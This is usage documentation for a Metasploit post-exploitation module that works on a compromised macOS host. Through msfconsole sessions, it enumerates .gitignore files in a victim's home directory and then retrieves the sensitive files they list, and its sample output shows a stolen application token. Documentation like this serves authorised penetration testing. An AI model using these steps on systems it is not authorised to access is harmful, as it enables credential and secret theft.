## Vulnerable Application

This module finds and retrieves gitignore files from the user's home directory,
as well as retrieves the contents of files found in the gitignore.

## Verification Steps

  1. Start msfconsole
  2. Get at least a user shell

  Locate gitignore files:
  3. Do: `use post/osx/gather/gitignore`
  4. Do: `set session #`
  5. Do: `set mode 1`
  5. Do: `run`
  6. You should see a list of all gitignore files with absolute path located recurively from the users'r home directory

  Retrieve gitignore files:
  7. Do: `set mode 2`
  8. Do: `set file /absolute/path/to/.gitignore`
  9. Do `run`
  10. You should see the contents of the gitignore file. If you see anything useful, you can also retrieve these artifacts.

  Retrieve sensitive or interesting artifacts:
  11. Do: `set file /absolute/path/to/sensitive_file`
  12. Do: `run`

## Options

  ### MODE
  Select between enumeration and retrieval mode.
  Mode 1 is enumeration of all gitignore files recursively in the user's home directory.
  Mode 2 is used for retrieving file contents should they be ASCII text.

  ### FILE
  This is the absolute file path to the .gitignore and/or sensitive file you would like to retrieve.

## Scenarios

Gitignore files commonly list items developers don't want leaked and generally contain sensitive information.

### Finding gitignore files

```
msf6 post(osx/gather/gitignore) > set mode 1
msf6 post(osx/gather/gitignore) > set session 1
msf6 post(osx/gather/gitignore) > run

[*] Fetching .gitignore files
[+] /Users/victim/Documents/project/.gitignore
[+] ...
[*] Post module execution completed
```

### Recovering contents of a specific gitignore

```
msf6 post(osx/gather/gitignore) > set file /Users/victim/project/.gitignore
msf6 post(osx/gather/gitignore) > set mode 2
msf6 post(osx/gather/gitignore) > run

[+] /Users/victim/project/.gitignore
[+] .sensitive_file
[*] Post module execution completed
```

### Recovering contents of a sentitive file

```
msf6 post(osx/gather/gitignore) > set file /Users/victim/project/.sensitive_file
msf6 post(osx/gather/gitignore) > run

[+] /Users/victim/project/.sensitive_file
[+] PWNED_APPLICATION_TOKEN=cHduZWQgdXIgZ2l0aHVi
[*] Post module execution completed
```

